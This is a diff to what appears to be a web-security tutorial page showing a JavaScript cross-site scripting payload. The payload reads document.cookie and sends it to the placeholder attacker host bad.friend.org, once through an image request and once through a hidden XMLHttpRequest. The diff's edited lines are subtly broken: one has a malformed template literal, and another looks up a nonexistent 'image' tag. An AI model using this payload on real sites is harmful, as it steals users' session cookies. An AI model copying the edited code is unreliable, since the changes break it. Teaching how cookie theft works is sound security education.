@@ -17,16 +17,16 @@ For the code snippet below, we assume your server is accessible at the domain `b
 
 {% highlight javascript linenos %}
 
-let yourCookie = encode(document.cookie);
+let yourCookie = encodeURI(document.cookie);
 
 // retrieve an image from the server, but send the victim's cookies as well.
-let url = `http://bad.friend.org/picture.jpg?cookie=${yourCookie}`;
-document.getElementById('image').src = url;
+let url = `http://bad.friend.org/picture.jpg?$yourCookies={yourCookie}`;
+document.getElementsByTagName('image')[0].src = url;
 
 // AJAX - Unnoticed by the typical user, low-profile payload
 
 // string template https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals
-url = `http://bad.friend.org/gimmie?cookie=${yourCookie}`;
+url = `http://bad.friend.org/gimmie?yourCookies=${yourCookie}`;
 let xhr = new XMLHttpRequest();
 xhr.open('GET', url, true);
 xhr.send();
